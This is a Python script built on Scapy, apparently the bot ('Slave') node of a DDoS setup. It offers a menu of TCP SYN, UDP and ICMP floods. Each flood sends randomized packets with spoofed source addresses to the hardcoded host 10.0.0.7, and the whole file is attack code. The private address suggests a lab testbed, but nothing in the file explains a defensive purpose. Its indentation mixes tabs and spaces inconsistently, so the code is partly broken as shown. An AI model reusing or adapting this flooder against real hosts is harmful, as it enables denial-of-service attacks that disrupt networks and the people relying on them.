#!/usr/bin/python
from scapy.all import *
from time import ctime,time
import random

class Slave():
    def __init__(self, sock=None):
        print("DDoS mode loaded")

        # get ntp times
	ntp_res=time()

        
    def doTheDos(self):
	attack = input ("--------------------------------------\n"
				"Choose the type of attack :\n"
				"1 for TCP SYN FLOOD \n"
				"2 for UDP FLOOD \n" 
				"3 for ICMP FLOOD \n"
			  "--------------------------------------\n"
				"Answer : ")
        x = int(attack)
	if x == 1 :
		print ("|[DDoS TCP SYN FLOOD Attack Activated....!!!!] |")
		addr = random.randrange(10,254)
		myaddr =  ".".join(["10","0","0",str(addr)])
		for source in range (1024,1124) :
			bytes = random.randrange(128, 1024)
			pkt_count = random.randrange(100,1000)
		    	IPlayer = IP(src=myaddr, dst="10.0.0.7")
			payload = "Z"*bytes
			TCPLayer= TCP(sport=source,dport=5201,flags="S")
		    	pkt = IPlayer / TCPLayer / payload
		    	send(pkt , count=pkt_count, inter=0.01)
			
		print("---------------ATTACK FINISHED---------------")

	if x == 2 :
		print ("|[DDoS UDP FLOOD Attack Activated....!!!!] |")
		addr = random.randrange(10,254)
		myaddr =  ".".join(["10","0","0",str(addr)])
		for source in range (1024,1124) :
			bytes = random.randrange(128, 1024)
			pkt_count = random.randrange(100,1000)
			IPlayer = IP(src=myaddr, dst="10.0.0.7")
			payload ="Z"*bytes
			UDPLayer= UDP(sport=source,dport=5201)
			pkt = IPlayer / UDPLayer / payload
			send(pkt , count=pkt_count, inter=0.005)
				
		print("---------------ATTACK FINISHED---------------")
        
    	if x == 3 :
		print ("|[DDoS ICMP Flood Attack Activated....!!!!] |")
		addr = random.randrange(10,254)
		myaddr =  ".".join(["10","0","0",str(addr)])
		for _ in range (100) :
			bytes = random.randrange(64, 128)
			pkt_count = random.randrange(100,1000)
	    		IPlayer = IP(src=myaddr, dst="10.0.0.7")
			payload ="Z"*bytes
	    		pkt = IPlayer / ICMP() / payload
	    		send(pkt , count=pkt_count, inter=0.01)
        
		print ("---------------ATTACK FINISHED---------------")

if __name__ == '__main__':
  slaveNode = Slave()
  slaveNode.doTheDos()
